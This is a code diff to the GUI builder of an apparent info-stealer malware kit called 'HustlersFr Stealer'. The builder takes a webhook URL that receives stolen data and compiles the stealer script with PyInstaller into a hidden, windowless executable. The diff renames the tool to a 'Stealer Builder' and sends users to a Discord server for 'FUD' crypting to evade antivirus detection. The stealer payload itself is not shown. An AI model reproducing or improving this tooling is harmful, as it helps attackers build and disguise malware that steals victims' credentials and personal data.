@@ -5,7 +5,7 @@ from tkinter import messagebox, filedialog
 
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
-app.title(f"HustlersFrBuilder ")
+app.title(f"HustlersFr Stealer Builder ")
 app.iconbitmap("img\\xd.ico")
 app.geometry("400x240")
 app.resizable(False, False)
@@ -59,19 +59,19 @@ def build_exe():
         else:
             icon_option = ''
 
-        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou Can't Make exe FUD without converting to another file with u need to spend at least $30 on a legit crypter"
+        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from our discord - https://discord.gg/xC2NduXHaG"
         messagebox.showinfo("Information", message)
 
         # Customizing PyInstaller build command
         dist_path = os.path.join(os.getcwd(), "dist")
-        build_command = f'pyinstaller creal.py --noconsole --onefile{icon_option}'
+        build_command = f'pyinstaller hustlersfr.py --noconsole --onefile{icon_option}'
         os.system(build_command)
 
-        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
+        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Discord channel to support and receive lastest updates!")
     else:
         messagebox.showerror("Error", "Invalid webhook URL!")
 
-label = ctk.CTkLabel(master=app, text="HustlersFr", text_color=("white"), font=("Helvetica", 26))
+label = ctk.CTkLabel(master=app, text="HustlersFr Stealer", text_color=("white"), font=("Helvetica", 26))
 label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)
 
 entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
